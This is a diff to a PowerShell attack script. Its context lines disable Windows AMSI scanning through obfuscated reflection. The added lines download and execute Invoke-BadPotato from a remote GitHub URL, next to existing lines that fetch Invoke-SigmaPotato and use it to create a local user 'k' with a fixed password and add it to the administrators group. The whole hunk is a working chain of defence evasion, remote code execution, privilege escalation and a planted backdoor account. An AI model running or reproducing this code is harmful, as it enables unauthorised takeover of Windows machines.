@@ -68,6 +68,8 @@ $ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
 $object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
 $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-BadPotato.ps1')
+Invoke-BadPotato
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
